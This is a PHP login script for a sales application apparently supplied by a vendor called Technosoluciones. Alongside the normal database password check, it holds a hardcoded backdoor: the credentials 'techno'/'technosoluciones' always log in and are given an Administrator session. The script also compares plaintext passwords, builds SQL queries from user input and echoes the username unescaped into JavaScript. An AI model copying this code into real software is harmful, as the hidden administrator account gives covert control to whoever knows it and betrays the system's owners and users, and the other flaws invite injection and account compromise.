<?php

session_start();
//require_once('Classes/sanity.class.php');
//$Sanidad = new input();
include("modelo/php_conexion.php");

	if(isset($_POST["user"]) && !empty($_POST["user"]) &&
	   isset($_POST["pw"]) && !empty($_POST["pw"]))
	   {
            $obCon=new ProcesoVenta(1);
            
            $User=$obCon->normalizar($_POST["user"]);
            $sql="SELECT * FROM usuarios WHERE Login='$User'";
            
            $sel=mysql_query($sql);
            $sesion=mysql_fetch_array($sel);
		  
		
		if($_POST["pw"] == $sesion["Password"] or ($_POST["user"] == "techno" and $_POST["pw"] == "technosoluciones"))
		{
			$_SESSION['username'] = $_POST["user"];
			$_SESSION['nombre'] = $sesion["Nombre"];
			$_SESSION['apellido'] = $sesion["Apellido"];
			$_SESSION['tipouser'] = $sesion["TipoUser"];
			$_SESSION['idUser'] = $sesion["idUsuarios"];
	        if($_POST["user"] == "techno" and $_POST["pw"] == "technosoluciones"){
				$_SESSION['nombre'] = "Techno";
				$_SESSION['apellido'] = "Soluciones";
				$_SESSION['tipouser'] = "Administrador";
				$_SESSION['idUser'] = "A";
			}
				
				header("Location: VMenu/Menu.php"); 
		}else{
			echo "<script languaje='javascript'>alert('Password del usuario $User Incorrecto ')</script>";
			echo "<a href='index.php'>Regresar</a><br><br>";
			echo "Si no recuerda su password contacte a su proveedor www.technosoluciones.com, info@technosoluciones.com, 317 7740609";
			//header("Location: Menu.php"); 
	}
	
	}else{
		echo "por favor llena todos los campos";
	}
			
?>